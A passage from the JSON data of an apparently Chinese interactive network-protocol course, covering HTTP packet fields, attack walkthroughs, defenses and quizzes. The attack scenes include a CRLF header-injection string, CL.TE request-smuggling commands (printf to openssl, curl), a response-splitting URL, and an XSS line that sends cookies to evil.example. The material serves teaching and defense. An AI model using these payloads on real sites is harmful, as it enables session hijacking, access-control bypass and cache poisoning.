值与属性","off":69,"len":37,"bits":"","tone":"cookie","desc":"键值对后跟属性：Path 限定发送路径，HttpOnly 禁止脚本读取，Secure 限定只在 TLS 下发送，SameSite 控制跨站携带。","sec":"这里缺了 Secure 与 SameSite。没有 Secure，明文 HTTP 下 Cookie 会被中间人抓走；没有 SameSite，跨站请求会自动带上它，CSRF 由此成立。"},{"name":"Content-Length:","cn":"首部名（长度）","off":106,"len":15,"bits":"","tone":"header","desc":"声明主体字节数的两种方式之一（另一种是 Transfer-Encoding: chunked）。","sec":"两者同时出现且互相矛盾，就是请求偷渡（CL.TE / TE.CL）的入口——前端与后端各信一个，报文边界出现两个版本。"},{"name":"CL-Value","cn":"长度值","off":121,"len":4,"bits":"","tone":"value","desc":"本例无主体，长度 0。","sec":"长度值与实际字节不符是“响应拆分”的产物：多出来的字节会被当成下一个响应。"},{"name":"CRLF","cn":"空行（首部结束）","off":125,"len":2,"bits":"","tone":"pad","desc":"标志首部结束。","sec":"响应拆分的核心就是在这里之前注入一个额外的 CRLF CRLF，把一条响应劈成两条。"}]},{"title":"HTTP/2 帧头 + SETTINGS 帧（固定 9 字节头 + 18 字节载荷）","note":"HTTP/2 的最小传输单位是帧；帧头只有 9 字节，靠 Type 与 Stream ID 在一条 TCP 连接上并发多条流","hex":"00 00 12 04 00 00 00 00 00 00 03 00 00 00 64 00 04 00 10 00 00 00 02 00 00 00 00","fields":[{"name":"Length","cn":"帧长度","off":0,"len":3,"bits":"3 字节无符号大端，上限受 SETTINGS_MAX_FRAME_SIZE 约束（默认 16384）","tone":"len","desc":"24 位整数，只表示载荷长度，不含 9 字节帧头。本例 0x12=18，即三个 6 字节的参数字。","sec":"长度与实际载荷不一致会触发 FRAME_SIZE_ERROR；也是攻击面——有的实现在分帧重组时按声明长度预分配缓冲区，可被大长度值拖垮内存。"},{"name":"Type","cn":"帧类型","off":3,"len":1,"bits":"","tone":"type","desc":"8 位帧类型：0x00 DATA、0x01 HEADERS、0x02 PRIORITY、0x03 RST_STREAM、0x04 SETTINGS、0x06 PING、0x07 GOAWAY、0x08 WINDOW_UPDATE。","sec":"RST_STREAM 可被滥用做“重置泛洪”：攻击者在一条连接里狂发 RST_STREAM，服务器为每次重置付出计算却拿不到任何收益。"},{"name":"Flags","cn":"帧标志","off":4,"len":1,"bits":"bit0 END_STREAM/ACK / bit3 PADDED / bit5 PRIORITY / bit2 END_HEADERS（按帧类型解释）","tone":"flag","desc":"8 位，含义随类型而变。SETTINGS 的 0x01 表示 ACK（此时载荷必须为空）；DATA 的 0x01 表示 END_STREAM、0x08 表示 PADDED。","sec":"标志位解析不一致是走私的新战场：同一个字节，前端当作“带填充”，后端当作“无填充”，填充长度字段就成了夹带区。"},{"name":"R+StreamID","cn":"保留位+流标识","off":5,"len":4,"bits":"bit0 保留 R / bit1-31 Stream Identifier","tone":"id","desc":"31 位流标识，最高位 R 保留必须为 0。SETTINGS 作用于整条连接，故 Stream ID=0。","sec":"流 ID 单调整数递增且由客户端发起奇数流；跳过 ID 或复用已关闭的流是协议错误，也是某些实现崩溃的触发点。"},{"name":"Setting1","cn":"参数 1：MAX_CONCURRENT_STREAMS","off":9,"len":6,"bits":"","tone":"opt","desc":"16 位标识 + 32 位值。0x0003=100，限制对端可同时打开 100 条流。","sec":"这个上限就是资源保护阀。设得过大，对手可用海量并发流耗尽内存；设得过小，正常页面加载被拖慢。"},{"name":"Setting2","cn":"参数 2：INITIAL_WINDOW_SIZE","off":15,"len":6,"bits":"","tone":"opt","desc":"0x0004=1048576，初始流控窗口 1 MB。HTTP/2 在连接与流两个层级都做流量控制。","sec":"窗口管理缺陷会导致“窗口更新饥饿”：故意不更新窗口即可让某条流永久阻塞（应用层 DoS），而连接层看起来完全健康。"},{"name":"Setting3","cn":"参数 3：ENABLE_PUSH","off":21,"len":6,"bits":"","tone":"opt","desc":"0x0002=0，禁用服务端推送。","sec":"推送曾被用于在用户未请求时下发资源，也被滥用于缓存投毒（推送内容进了共享缓存），因此主流实现已默认关闭。"}]},{"title":"HTTP/2 DATA 帧（9 字节头 + 5 字节载荷）","note":"与 SETTINGS 同一条连接、不同流：Stream ID=1 + END_STREAM 标志，展示“帧→消息→流”的关系","hex":"00 00 05 00 01 00 00 00 01 68 65 6c 6c 6f","fields":[{"name":"Length","cn":"帧长度","off":0,"len":3,"bits":"","tone":"len","desc":"0x000005 = 5，载荷正好是 5 个字节 'hello'。","sec":"DATA 帧长度受流控窗口约束；超窗发送是 FLOW_CONTROL_ERROR，也是压测与 DoS 的常用手法。"},{"name":"Type","cn":"帧类型","off":3,"len":1,"bits":"","tone":"type","desc":"0x00 = DATA，承载实体主体。","sec":"DATA 与 HEADERS 分离，使“首部先行、主体后到”成为常态，压缩与过滤必须在流重组之后做才可靠。"},{"name":"Flags","cn":"帧标志","off":4,"len":1,"bits":"bit0 END_STREAM / bit3 PADDED","tone":"flag","desc":"0x01 = END_STREAM，表示这条流的数据到此结束。","sec":"END_STREAM 的判定错误会造成“半关闭”状态残留，攻击者据此让服务器长期持有已完成的流，耗尽并发配额。"},{"name":"R+StreamID","cn":"保留位+流标识","off":5,"len":4,"bits":"bit0 保留 R / bit1-31 Stream Identifier","tone":"id","desc":"Stream ID=1，客户端发起的第一个流。","sec":"流 ID 与请求的对应关系是缓存与鉴权的基础；若中间件按 Stream ID 而非内容做会话关联，跳号即可造成请求错配。"},{"name":"Payload","cn":"载荷","off":9,"len":5,"bits":"","tone":"data","desc":"5 字节实体主体。真实场景是 HTML、图片或 JSON。","sec":"HTTP/2 的正文仍然不加密（加密由上层的 TLS 提供）；同时 HPACK 头部压缩存在 CRIME/BREACH 类侧信道——压缩率随秘密内容变化，可被逐字节推断。"}]}],"attacks":[{"name":"HTTP Header Injection","cn":"HTTP 报文注入（CRLF 首部注入）","impact":"用户输入被拼进首部后注入额外首部，改写上游代理的信任判定，越权访问内网接口","steps":[{"who":"攻击者","to":"Web 服务器","label":"在回显型参数中提交 %0d%0aX-Forwarded-For:%2010.0.0.1","note":"应用把参数直接拼进响应首部且未过滤 CR/LF，注入成功"},{"who":"Web 服务器","to":"反向代理","label":"响应首部多出一行 X-Forwarded-For: 10.0.0.1","note":"代理看到的是“来自内网 10.0.0.1 的请求”"},{"who":"反向代理","to":"后端应用","label":"按被污染的 X-Forwarded-For 判定来源可信，放行 /admin","note":"信任边界被一行注入改写，IP 白名单形同虚设"},{"who":"攻击者","to":"后端应用","label":"GET /admin/users HTTP/1.1，附带伪造的 X-Forwarded-For","note":"越权读取用户列表；访问日志里记录的是伪造来源，溯源被误导"}],"defense":"对所有进入首部的值做 CR/LF 白名单过滤与严格编码，绝不把用户输入拼进首部；代理层丢弃客户端自带的 X-Forwarded-For 并自行重写。"},{"name":"HTTP Request Smuggling (CL.TE)","cn":"HTTP 请求偷渡","impact":"前后端对报文边界理解不一致，夹带的请求被后端当作下一个请求执行，可越权读取他人响应或污染缓存","steps":[{"who":"攻击者","to":"前端代理","label":"POST / HTTP/1.1 + Content-Length: 6 + Transfer-Encoding: chunked，块体 0 后接夹带内容","note":"同时给出两个互相矛盾的长度声明，触发解析分歧"},{"who":"前端代理","to":"后端服务器","label":"前端信 Content-Length，把 6 字节之后再接的整段都转发过去","note":"前端认为“一个请求已结束”，后端认为“块体还没读完”"},{"who":"攻击者","to":"前端代理","label":"在块体尾部夹带 GET /admin HTTP/1.1\\r\\nHost: bank.example\\r\\n\\r\\n","note":"这段字节停留在后端连接的缓冲区里，成为下一个请求的开头"},{"who":"受害者","to":"前端代理","label":"正常提交 GET /profile","note":"受害者请求被拼到夹带残留之后，被后端解析成被污染的形式"},{"who":"后端服务器","to":"受害者","label":"按夹带出的 /admin 前缀处理，返回管理页内容给受害者","note":"越权数据进入受害者页面；若命中共享缓存，污染扩散到全体用户"}],"defense":"按 RFC 9112 拒绝同时出现 Content-Length 与 Transfer-Encoding 的报文，链路内统一使用同一解析实现或做规范化重写。"},{"name":"Session Hijacking via Cookie Theft","cn":"Cookie 窃取与会话劫持","impact":"攻击者拿到 Session ID 后直接重放，无需口令即获得受害者完整账户权限","steps":[{"who":"受害者","to":"Web 服务器","label":"POST /login 成功，响应 Set-Cookie: SID=8f3a…; Path=/（无 HttpOnly、无 Secure）","note":"SID 即身份；服务器此后只认这串字符，不认人"},{"who":"攻击者","to":"受害者浏览器","label":"在评论区注入 <script>new Image().src='//evil.example/?c='+document.cookie<\/script>","note":"缺少 HttpOnly，脚本可读 Cookie；缺少 CSP，内联脚本直接执行"},{"who":"受害者浏览器","to":"攻击者","label":"GET /?c=SID=8f3a1c02d4e5","note":"凭据通过受害者自己的浏览器外带，不需要任何网络位置优势"},{"who":"攻击者","to":"Web 服务器","label":"重放 Cookie: SID=8f3a1c02d4e5，请求 /account","note":"服务器无法区分本人与持票人，会话被接管；受害者毫无感知"}],"defense":"Cookie 加 HttpOnly + Secure + SameSite，全站 HTTPS，配合 CSP 阻断脚本注入；登录后换发新 ID 并使用短生命周期。"},{"name":"HTTP Response Splitting","cn":"响应拆分与缓存投毒","impact":"一个响应在字节层被劈成两个，第二段被缓存当作目标资源的正版内容，全站用户在 TTL 内看到攻击者页面","steps":[{"who":"攻击者","to":"Web 服务器","label":"GET /go?url=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a…","note":"Location 的值未过滤 CRLF，注入点成立"},{"who":"Web 服务器","to":"CDN 缓存","label":"返回的首部中真的出现两个 CRLF CRLF 与第二个状态行","note":"一条响应在字节流上被拆成“302 头”与“200 完整响应”两段"},{"who":"CDN 缓存","to":"自身存储","label":"把第二段按 URL / 的缓存键写入，Content-Length 与实际正文自洽","note":"缓存无法分辨这是攻击者伪造的响应，它只按字节解析"},{"who":"受害者","to":"CDN 缓存","label":"请求 https://bank.example/，命中被投毒的条目","note":"全站用户在一段时间内都拿到攻击者构造的登录页"}],"defense":"对写入首部的所有值做 CR/LF 剥离与编码；缓存层对响应做严格校验（只允许一个状态行、长度与实际一致），并缩短可疑条目 TTL。"}],"defenses":[{"name":"HTTPS + HSTS","how":"用 TLS 承载全部 HTTP 语义，证书校验服务器身份；HSTS 让浏览器在此后一段时间内强制只走 HTTPS 并拒绝用户点击“继续访问”。","limit":"只保护信道，不保护服务端逻辑：会话固定、CSRF、XSS、越权在 HTTPS 下照旧成立；HSTS 首次访问仍可能被降级（需 preload 列表缓解）。"},{"name":"Cookie 安全属性（HttpOnly / Secure / SameSite）","how":"HttpOnly 让 document.cookie 读不到，Secure 限定只在 TLS 连接上发送，SameSite=Lax/Strict 阻止跨站请求自动携带。","limit":"防不住同站 XSS（脚本仍可发起请求），也防不住已泄露 ID 的重放；SameSite 还会被浏览器默认策略与老旧客户端行为差异削弱。"},{"name":"统一报文解析（RFC 9112 互斥规则）","how":"拒绝同时含 Content-Length 与 Transfer-Encoding 的报文，禁止歧义编码（如带空格的 chunk 长度、重复首部），链路内前后端共用同一解析器或由代理做规范化重写。","limit":"依赖链路上每一个组件同步升级；只要还有一台旧代理参与，歧义就仍然存在，而攻击者只需要找到这一台。"},{"name":"CSP（内容安全策略）","how":"用响应头声明允许的脚本源与 nonce，禁止内联脚本与 eval，把注入的脚本从“可执行”降级为“被拒绝”。","limit":"配置复杂、易漏（一次 nonce 复用即可绕过）；对已存在于页面逻辑中的 DOM XSS 只能缓解，且不能阻止数据外带类攻击。"}],"calcs":[],"quiz":[{"q":"HTTP/1.1 的管道化既然能连续发多个请求，为什么还有队头堵塞？","options":["因为 TCP 不允许乱序发送","因为响应必须按请求顺序返回，前一个慢就拖住后面全部","因为浏览器不支持管道化"],"a":1,"why":"管道化解决的只是“不用等响应就能发下一个请求”，服务器仍按序处理并按序返回；HTTP/2 才是用流 ID 让响应乱序到达、按流重组。"},{"q":"全站启用 HTTPS 后，为什么会话固定攻击仍然可能成功？","options":["因为 HTTPS 不加密 Cookie","因为固定攻击不需要窃听，只需让受害者用一个攻击者已知的 SID 登录","因为 HTTPS 无法防止 XSS"],"a":1,"why":"攻击者先在服务器建立陷阱会话并把该 SID 塞给受害者，受害者登录后这个已知 SID 被“升级”为已认证会话，全程无明文泄露，HTTPS 无从拦截。解法是登录后换发新 SID。"},{"q":"请求偷渡能成立的根本前提是什么？","options":["攻击者能破解 TLS","前后端对同一段字节的报文边界判断不一致","服务器没有开启 HTTP/2"],"a":1,"why":"CL.TE / TE.CL 的本质是长度声明互相矛盾而两端各信一个，于是同一段字节被切出两个报文，夹带内容成了“下一个请求”。"}]},"script":{"id":"http","notes":{"Method":{"short":"方法即能力，PUT 最险","more":"3 字节大写 ASCII，定义对资源的动作：GET/HEAD 读、POST 提交、PUT 覆盖、DELETE 删除、OPTIONS 探测、TRACE 回显。方法本身不带权限语义。","sec":"服务端误开 PUT，等于把写权限交给全网；TRACE 未关可被用于跨站追踪。"},"Request-Target":{"short":"路径加查询串，GET 必外泄","more":"origin-form 的目标，包含路径与查询串。查询串会进浏览器历史、代理日志与 Referer 头，任何中间环节都能读到。","sec":"凭据绝不能放查询串，它天然被记录、被转发给第三方。"},"Host-Value":{"short":"虚拟主机路由的枢纽","more":"HTTP/1.1 唯一必选首部的值，一台服务器用同一个 IP 承载多个站点，全靠这个名字决定命中哪个 vhost。","sec":"改成 internal.admin.example 常能直接摸到只绑内网域名的后台。"},"Cookie-Value":{"short":"会话凭据，拿到即等于本人","more":"键值对形式，SID 是服务端会话的索引，服务端不认人只认这串字符。整个会话体系里价值最高的一小段字节。","sec":"嗅探可截、XSS 可读、CSRF 可借，三者都不需要破解任何加密。"},"Set-Cookie:":{"short":"服务端下发凭据的唯一途径","more":"响应首部，携带键值对与属性：Path 限定发送路径，HttpOnly 禁止脚本读取，Secure 限定只在 TLS 下发送，SameSite 控制跨站携带。","sec":"缺 HttpOnly 是 XSS 偷凭据的前提，缺 SameSite 是 CSRF 的前提。"},"Cookie-Attrs":{"short":"属性决定凭据能被谁拿走","more":"Cookie 值与属性的合体。属性是边界不是建议：HttpOnly 让 document.cookie 读不到，Secure 让明文请求不带它，SameSite 拦跨站自动携带。","sec":"三个属性各封一条窃取路径，缺一条就漏一条。"},"Content-Length:":{"short":"长度声明，偷渡的入口","more":"声明主体字节数的两种方式之一，另一种是 Transfer-Encoding: chunked。两者同时出现且矛盾时，前后端可能各信一个。","sec":"CL.TE 与 TE.CL 的成立条件，就是这条首部与 TE 的解释不一致。"},"CL-Value":{"short":"长度值，与实际字节比对","more":"主体字节数。它必须与真实正文逐字节吻合；偏大就会把后续报文的字节吞进本次主体，偏小则把剩余字节留给下一个请求。","sec":"长度与实际不符是响应拆分与走私的共同产物。"},"R+StreamID":{"short":"流标识，HTTP/2 的并发单位","more":"31 位流标识加 1 位保留位。帧属于流、流属于连接，多条流可在一条 TCP 上并发并乱序重组；SETTINGS 作用于整条连接故为 0。","sec":"跳号或复用已关闭的流是协议错误，也是某些实现崩溃的触发点。"},"Flags":{"short":"帧标志，语义随类型变","more":"8 位标志，含义由帧类型决定：DATA 的 0x01 是 END_STREAM、0x08 是 PADDED；SETTINGS 的 0x01 是 ACK。同一字节解释不同。","sec":"对标志位理解不一致，就是新一代走私的夹带区。"}},"acts":[{"key":"normal","no":"第 1 幕","title":"它正常怎么工作","desc":"请求行 + 首部 + 空行，服务器用一个 Cookie 记住你","lead":"先看一次登录。注意报文边界只靠 CRLF 与长度字段约定，没有长度前缀。","scenes":[{"name":"一次登录与取页","cmds":{"linux":[{"c":"curl -v --http1.1 'https://bank.example/login?user=alice' -o /dev/null","n":"-v 打出请求行与全部首部，看 CRLF 与空行怎么切出报文","s":"《系统》Linux.md · curl"},{"c":"curl -sI https://bank.example/","n":"只看响应首部：状态码、Location、Set-Cookie 属性一目了然","s":"《系统》Linux.md · curl"},{"c":"sudo tcpdump -A -s0 'tcp port 80'","n":"明文抓一次，首部逐行可读，正文紧随空行","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"$r = Invoke-WebRequest https://bank.example/ -MaximumRedirection 0 -SkipHttpErrorCheck; $r.Headers","n":"打印全部响应首部，-MaximumRedirection 0 才能看到 3xx 本身","s":"补充（vault 未收录 Invoke-WebRequest，抓首部最直接）"},{"c":"(Invoke-WebRequest https://bank.example/ -SessionVariable s).StatusCode; $s.Cookies.GetCookies('https://bank.example')","n":"拿状态码和会话 Cookie 及其属性","s":"补充（vault 未收录 Invoke-WebRequest）"}],"cmd":[{"c":"curl.exe -v --http1.1 https://bank.example/","n":"Win10 起自带 curl，输出与 Linux 完全一致","s":"补充（Windows 自带 curl.exe，vault 未收录）"},{"c":"netstat -ano | findstr :443","n":"看这条连接与占用它的 PID","s":"《系统》Windows CMD.md · netstat"}]},"steps":[{"who":"浏览器","to":"服务器","pkt":0,"bubble":"GET","hl":["Method","Request-Target","HTTP-Version"],"vals":{"Method":"GET","Request-Target":"/login?user=alice","HTTP-Version":"HTTP/1.1"},"say":"请求行三件套：方法、目标、版本，空格分隔、CRLF 收尾。","sub":"查询串会进日志、历史与 Referer。"},{"who":"浏览器","to":"服务器","pkt":0,"bubble":"Host + Cookie","hl":["Host:","Host-Value","Cookie:","Cookie-Value"],"vals":{"Host-Value":"bank.example","Cookie-Value":"SID=8f3a1c02d4e5"},"say":"Host 决定命中哪台虚拟主机，Cookie 让服务器认出这是谁。","sub":"协议本身无状态，身份全靠这串字符。"},{"who":"服务器","to":"浏览器","pkt":1,"bubble":"302 + Set-Cookie","hl":["Status-Code","Location:","Set-Cookie:","Cookie-Attrs"],"vals":{"Status-Code":"302","Location-Value":"https://bank.example/home","Cookie-Attrs":"SID=8f3a…; Path=/; HttpOnly"},"say":"登录成功：302 跳首页，同时下发带 HttpOnly 的会话 Cookie。","sub":"Location 与 Set-Cookie 是最常出事的两个首部。"},{"who":"服务器","to":"浏览器","pkt":1,"bubble":"空行定边界","hl":["Content-Length:","CL-Value","CRLF"],"vals":{"CL-Value":"0","CRLF":"单独 CRLF = 首部结束"},"say":"首部后一个空行宣告结束，Content-Length 说明正文有多长。","sub":"报文边界只靠字节模式，不靠长度前缀。"},{"who":"服务器","to":"浏览器","pkt":2,"bubble":"HTTP/2 SETTINGS","hl":["Length","Type","Flags","R+StreamID"],"vals":{"Length":"18","Type":"0x04 SETTINGS","R+StreamID":"0（作用于整条连接）"},"say":"换成 HTTP/2 后最小单位是帧，9 字节帧头里带类型与流 ID。","sub":"一条连接并发多条流，响应可乱序重组。"}]}]},{"key":"attack","no":"第 2 幕","title":"它会被怎么打","desc":"让两端对报文边界理解不一致；再把会话凭据从浏览器里取走","lead":"两个场景：一个骗的是中间件，一个骗的是浏览器。共同点是都没有碰密码。","scenes":[{"name":"请求偷渡 CL.TE","cmds":{"linux":[{"c":"printf 'POST /search HTTP/1.1\\r\\nHost: bank.example\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG' | openssl s_client -connect bank.example:443 -quiet","n":"手工发一份双长度报文，看前端与后端谁先报错","s":"补充（vault 无 openssl s_client，走私验证的原始手段）"},{"c":"curl -v --http1.1 -X POST https://bank.example/search -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6' --data-binary $'0\\r\\n\\r\\nG'","n":"用 curl 复现同一组互相矛盾的首部","s":"《系统》Linux.md · curl"},{"c":"sudo tcpdump -A -s0 'tcp port 80' | grep -A2 'Transfer-Encoding'","n":"抓一次看两个长度头是否同时出现","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"Invoke-WebRequest https://bank.example/search -Method POST -Headers @{'Transfer-Encoding'='chunked';'Content-Length'='6'} -Body \"0`r`n`r`nG\" -SkipHttpErrorCheck","n":"复现矛盾首部，多数栈会直接拒","s":"补充（vault 未收录 Invoke-WebRequest）"},{"c":"Get-NetTCPConnection -RemotePort 80 | Select-Object LocalPort,State","n":"偷渡成功后连接常卡在 Established 不释放","s":"《系统》PowerShell.md · Get-NetTCPConnection"}],"cmd":[{"c":"netstat -ano | findstr :80","n":"找异常长存的连接与所属进程","s":"《系统》Windows CMD.md · netstat"},{"c":"curl.exe -v -X POST https://bank.example/search -H \"Transfer-Encoding: chunked\" -H \"Content-Length: 6\" --data-binary \"0\"","n":"同一条复现，在 Windows 侧执行","s":"补充（Windows 自带 curl.exe，vault 未收录）"}]},"steps":[{"who":"攻击者","to":"前端代理","pkt":0,"evil":true,"bubble":"双长度 POST","hl":["Method","Request-Target","HTTP-Version"],"vals":{"Method":"POST","Request-Target":"/search","HTTP-Version":"HTTP/1.1"},"say":"同一报文既给 Content-Length: 6，又给 Transfer-Encoding: chunked。","sub":"两个长度声明互相矛盾，两端各信一个。"},{"who":"前端代理","to":"后端服务器","pkt":0,"bubble":"按 CL 转发","hl":["HTTP-Version","CRLF"],"vals":{"HTTP-Version":"HTTP/1.1","CRLF":"前端认为边界在此，整段照发"},"say":"前端信 Content-Length，把 6 字节之后的全部字节原样转给后端。","sub":"它以为请求已结束，后端以为块体还没读完。"},{"who":"攻击者","to":"前端代理","pkt":0,"evil":true,"bubble":"夹带请求","hl":["Method","Request-Target","Host-Value"],"vals":{"Method":"GET（藏在块体里）","Request-Target":"/admin","Host-Value":"bank.example"},"say":"块体尾部夹一条完整的 GET /admin，字节停在后端缓冲区里。","sub":"它成了后端连接上的下一个请求。"},{"who":"受害者","to":"前端代理","pkt":0,"bubble":"正常请求","hl":["Method","Request-Target","Cookie:"],"vals":{"Method":"GET","Request-Target":"/profile","Cookie:":"SID=…"},"say":"受害者照常请求自己的页面，请求被排到夹带残留之后。","sub":"排队位置决定了他拿到谁的响应。"},{"who":"后端服务器","to":"受害者","pkt":1,"bubble":"越权响应","hl":["Status-Code","Content-Length:","CL-Value"],"vals":{"Status-Code":"200","CL-Value":"= 管理页正文长度"},"say":"后端按夹带出的 /admin 处理，把管理页内容回给了受害者。","sub":"若命中共享缓存，污染扩散到全体用户。"}]},{"name":"Cookie 窃取与会话劫持","cmds":{"linux":[{"c":"curl -v -c /tmp/jar.txt https://bank.example/login -d 'user=alice&pass=x'","n":"-c 存 Cookie，-v 里能看到 Set-Cookie 有没有 HttpOnly","s":"《系统》Linux.md · curl"},{"c":"curl -si https://bank.example/login -d 'user=alice' | grep -i set-cookie","n":"只挑 Set-Cookie 行，逐个属性检查","s":"《系统》Linux.md · curl"},{"c":"sudo tcpdump -A -s0 'tcp port 80' | grep -i 'cookie:'","n":"明文链路上直接读出 SID","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"(Invoke-WebRequest https://bank.example/login -Method POST -Body @{user='alice'} -SessionVariable s).Headers['Set-Cookie']","n":"直接看下发的属性，缺 HttpOnly 一眼可见","s":"补充（vault 未收录 Invoke-WebRequest）"},{"c":"Get-NetTCPConnection -RemotePort 80 | Select-Object RemoteAddress,State","n":"确认这条会话还活着，重放才有意义","s":"《系统》PowerShell.md · Get-NetTCPConnection"}],"cmd":[{"c":"curl.exe -si https://bank.example/login | findstr /i set-cookie","n":"单看 Set-Cookie 属性","s":"补充（Windows 自带 curl.exe，vault 未收录）"},{"c":"netstat -ano | findstr :80","n":"会话连接与所属进程","s":"《系统》Windows CMD.md · netstat"}]},"steps":[{"who":"服务器","to":"受害者","pkt":1,"bubble":"无 HttpOnly","hl":["Set-Cookie:","Cookie-Attrs"],"vals":{"Cookie-Attrs":"SID=8f3a…; Path=/（无 HttpOnly、无 Secure）"},"say":"会话 ID 就这几个字节，服务器此后只认它不认人。","sub":"缺 HttpOnly 脚本能读，缺 Secure 明文能嗅。"},{"who":"攻击者","to":"受害者浏览器","pkt":0,"evil":true,"bubble":"注入脚本","hl":["Method","Request-Target"],"vals":{"Method":"POST","Request-Target":"/comment"},"say":"在评论区提交 <script>，把 document.cookie 拼进图片地址。","sub":"缺 CSP，内联脚本直接执行。"},{"who":"受害者浏览器","to":"攻击者","pkt":0,"bubble":"凭据外带","hl":["Method","Request-Target","Host-Value"],"vals":{"Request-Target":"/?c=SID=8f3a1c02d4e5","Host-Value":"evil.example"},"say":"受害者自己的浏览器把会话 ID 送了出去。","sub":"一次图片请求，凭据就过了边界。"},{"who":"攻击者","to":"服务器","pkt":0,"evil":true,"bubble":"重放","hl":["Cookie:","Cookie-Value","Host-Value"],"vals":{"Cookie-Value":"SID=8f3a1c02d4e5","Host-Value":"bank.example"},"say":"拿同一串 SID 重放请求，服务器分不清本人与持票人。","sub":"会话被接管，受害者毫无感知。"}]}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"先让报文边界只有一个解，再让凭据拿不走","lead":"偷渡靠的是两端理解不一致，去掉这层差异就没了立足点；凭据靠属性封死三条路。","scenes":[{"name":"统一解析 + 安全 Cookie","cmds":{"linux":[{"c":"curl -sv --http1.1 https://bank.example/ 2>&1 | grep -E 'Cookie|HttpOnly|Strict-Transport'","n":"一次看 Cookie 属性与 HSTS 头有没有下发","s":"《系统》Linux.md · curl"},{"c":"curl -s -o /dev/null -w '%{http_code}\\n' -X POST https://bank.example/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6'","n":"期望 400 而不是 200，说明互斥规则真的生效","s":"《系统》Linux.md · curl"},{"c":"sudo tcpdump -A -s0 'tcp port 80' | grep -iE 'x-forwarded|content-length'","n":"观察客户端自带的伪造首部有没有穿过代理","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"Invoke-WebRequest https://bank.example/ -Headers @{'Transfer-Encoding'='chunked';'Content-Length'='6'} -SkipHttpErrorCheck","n":"期望被 400 挡住；-SkipHttpErrorCheck 才能读到 4xx","s":"补充（vault 未收录 Invoke-WebRequest）"},{"c":"(Invoke-WebRequest https://bank.example/).Headers['Strict-Transport-Security']","n":"HSTS 是否下发，决定之后的明文请求会不会被浏览器改写","s":"补充（vault 未收录 Invoke-WebRequest）"}],"cmd":[{"c":"curl.exe -s -o NUL -w \"%{http_code}\" -X POST https://bank.example/ -H \"Transfer-Encoding: chunked\"","n":"返回 400 说明互斥规则生效","s":"补充（Windows 自带 curl.exe，vault 未收录）"},{"c":"netstat -ano | findstr :443","n":"确认连接仍走 TLS","s":"《系统》Windows CMD.md · netstat"}]},"steps":[{"who":"前端代理","to":"攻击者","pkt":1,"bubble":"400 拒绝","hl":["Status-Code","Reason-Phrase","Content-Length:"],"vals":{"Status-Code":"400","Reason-Phrase":"Bad Request","Content-Length:":"0"},"say":"按 RFC 9112：CL 与 TE 同时出现即拒收，报文只允许一个解释。","sub":"夹带字节连进入缓冲区都没机会。"},{"who":"攻击者","to":"前端代理","pkt":0,"evil":true,"bubble":"重放偷渡","hl":["Method","Request-Target","CRLF"],"vals":{"Method":"POST","Request-Target":"/search","CRLF":"边界唯一，夹带无处落脚"},"say":"同一份字节重放，前后端算出的是同一个报文边界。","sub":"差异一消失，偷渡就没有立足点。"},{"who":"前端代理","to":"后端服务器","pkt":1,"bubble":"长度自洽","hl":["Content-Length:","CL-Value"],"vals":{"CL-Value":"与实际正文逐字节一致"},"say":"代理重写长度并规范首部，后端只看到一种编码。","sub":"链路统一解析实现，互斥规则才落得下去。"},{"who":"服务器","to":"受害者","pkt":1,"bubble":"安全 Cookie","hl":["Set-Cookie:","Cookie-Attrs"],"vals":{"Cookie-Attrs":"SID=…; HttpOnly; Secure; SameSite=Lax"},"say":"三个属性各封一条路：脚本读不到、明文发不出、跨站不自动带。","sub":"登录后再换发新 SID，旧 ID 立即失效。"},{"who":"受害者浏览器","to":"攻击者","pkt":0,"bubble":"读不到","hl":["Cookie:","Cookie-Value"],"vals":{"Cookie-Value":"（空：document.cookie 返回空串）"},"say":"同一个 XSS 再跑一遍，外带请求里没有任何凭据。","sub":"HttpOnly 让脚本连看都看不到。"}]}]}]}},{"proto":{"id":"mail","name":"Mail","cn":"电子邮件协议族","en":"SMTP / POP3 / IMAP4","layer":"application","chapter":"第五章","extra":false,"oneLine":"用一套“自称即事实”的文本对话把信件逐跳转发出去，发件人、正文、附件都没有任何内在的真实性证明。","sections":[{"h":"两段 SMTP：提交与中转，每一跳都是一个可读点","p":"发件人把信交给自己的服务器叫“提交”（submission），自己的服务器再交给对方的服务器叫“中转”（relay），中间可能经过多个 MTA 逐跳转发。SMTP 的设计目标是“可靠地把文本传过去”，因此它只要求下层提供一条可靠的、有序的字节流。\n\n这条结构决定了它的安全处境：邮件在链路上是明文的，每多一个 MTA 就多一个能读全文的位置，也多一个可能配置错误（开放中继）的节点。更根本的是，SMTP 把“声称”当成了“事实”——MAIL FROM 只是一个字符串，服务器最多校验域名语法，从不验证你是不是这个地址的主人。"},{"h":"信封与首部分离：To 和 RCPT TO 可以不是一回事","p":"一封邮件有两套地址：信封（MAIL FROM / RCPT TO）决定怎么投递、退信寄给谁，收件人看不到；首部（From / To / Cc / Bcc）决定显示成什么样，完全由发件人填写。两者互不校验，因此“显示 A、投递给 B”在协议上是完全合法的。\n\n这个分离本身有正当用途（密送、邮件列表、转发），但它让所有基于“看发件人是谁”的判断都失去意义。首部里唯一比较可信的是 Return-Path 与 Received——它们由投递方与经手 MTA 追加，而不是发件人写的。取证的核心方法就是只看这些“别人替你写的字段”，不看渲染出来的显示名。"},{"h":"三位应答码：SMTP 的对话节奏与错误信息泄露","p":"每条 SMTP 命令都以一行三位数字应答开头（可附文本），第一位表示成功或失败（2 成功、3 中间态、4 暂时性失败、5 永久性失败），第二位指出类别，第三位细分。整个会话就是“命令—应答”的一问一答，共约 14 条命令、20 余种应答。\n\n这套码表本身是安全信息源：220 的 banner 泄露软件与版本，250 的多行能力列表暴露支持的扩展，5xx 的措辞差异能区分“地址不存在”与“被拒绝”——后者足以用来枚举有效账号。因此生产环境的 MTA 通常要对 550 与 551 的区分、VRFY 与 EXPN 命令做收紧。"},{"h":"MIME 把二进制塞进 7 